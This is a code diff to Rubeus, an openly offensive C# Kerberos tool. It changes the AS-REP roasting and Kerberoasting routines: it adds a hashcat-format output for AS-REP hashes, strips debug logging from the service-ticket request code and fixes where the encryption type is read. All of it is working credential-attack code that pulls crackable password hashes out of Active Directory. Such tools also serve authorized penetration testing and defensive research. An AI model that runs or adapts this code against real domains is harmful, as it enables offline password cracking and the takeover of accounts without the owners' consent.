@@ -11,12 +11,12 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string userName, string domain, string domainController = "")
+        public static void ASRepRoast(string userName, string domain, string domainController = "", string format = "john")
         {
-            GetASRepHash(userName, domain, domainController);
+            GetASRepHash(userName, domain, domainController, format);
         }
 
-        public static void GetASRepHash(string userName, string domain, string domainController = "")
+        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "")
         {
             // roast AS-REPs for users without pre-authentication enabled
 
@@ -69,7 +69,18 @@ namespace Rubeus
 
                 // output the hash of the encrypted KERB-CRED in a crackable hash form
                 string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
-                string hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                repHash = repHash.Insert(32, "$");
+
+                string hashString = "";
+                if(format == "john")
+                {
+                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                }
+                else
+                {
+                    // eventual hashcat format
+                    hashString = String.Format("$krb5asrep${0}$*{1}${2}*${3}${4}", (int)Interop.KERB_ETYPE.rc4_hmac, userName, domain, repHash.Substring(0, 32), repHash.Substring(32));
+                }
 
                 Console.WriteLine("[*] AS-REP hash:\r\n");
 
@@ -223,53 +234,29 @@ namespace Rubeus
         {
             string domain = "DOMAIN";
 
-#if DEBUG
-            Console.WriteLine("[Debug:GetDomainSPNTicket] spn                 : {0}", spn);
-            Console.WriteLine("[Debug:GetDomainSPNTicket] userName            : {0}", userName);
-            Console.WriteLine("[Debug:GetDomainSPNTicket] distinguishedName   : {0}", distinguishedName);
-#endif
             if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
             {
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] Regex match!");
-#endif
                 // extract the domain name from the distinguishedname
                 Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                 string domainDN = dnMatch.Groups["Domain"].ToString();
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] domainDN  : {0}", domainDN);
-#endif
                 domain = domainDN.Replace("DC=", "").Replace(',', '.');
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] domain  : {0}", domain);
-#endif
             }
 
             try
             {
-                //Console.WriteLine("[*] Requesting ticket for SPN: {0}", spn);
+                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
+                //  GetRequest() stream was constributed to PowerView by @machosec
                 System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                 if (cred != null)
                 {
-#if DEBUG
-                    Console.WriteLine("[Debug:GetDomainSPNTicket] cred != null");
-#endif
                     ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                 }
                 else
                 {
-#if DEBUG
-                    Console.WriteLine("[Debug:GetDomainSPNTicket] cred == null, usingn SPN : {0}", spn);
-#endif
                     ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                 }
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] KerberosRequestorSecurityToken request successful");
-#endif
                 byte[] requestBytes = ticket.GetRequest();
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] requestBytes len: {0}", requestBytes.Length);
-#endif
+
                 if ( !((requestBytes[15] == 1) && (requestBytes[16] == 0)) )
                 {
                     Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
@@ -279,15 +266,8 @@ namespace Rubeus
                 // ignore the GSSAPI frame
                 byte[] apReqBytes = new byte[requestBytes.Length-17];
                 Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] Copied past GSSAPI frame. apReqBytes len: {0}", apReqBytes.Length);
-#endif
 
                 AsnElt apRep = AsnElt.Decode(apReqBytes);
-
-#if DEBUG
-                Console.WriteLine("[Debug:GetDomainSPNTicket] apRep.TagValue: {0}", apRep.TagValue);
-#endif
 
                 if (apRep.TagValue != 14)
                 {
@@ -298,11 +278,7 @@ namespace Rubeus
 
                 foreach (AsnElt elem in apRep.Sub[0].Sub)
                 {
-                    if (elem.TagValue == 0)
-                    {
-                        encType = elem.Sub[0].GetInteger();
-                    }
-                    else if (elem.TagValue == 3)
+                    if (elem.TagValue == 3)
                     {
                         foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                         {
@@ -310,6 +286,11 @@ namespace Rubeus
                             {
                                 foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                 {
+                                    if (elem3.TagValue == 0)
+                                    {
+                                        encType = elem3.Sub[0].GetInteger();
+                                    }
+
                                     if (elem3.TagValue == 2)
                                     {
                                         byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
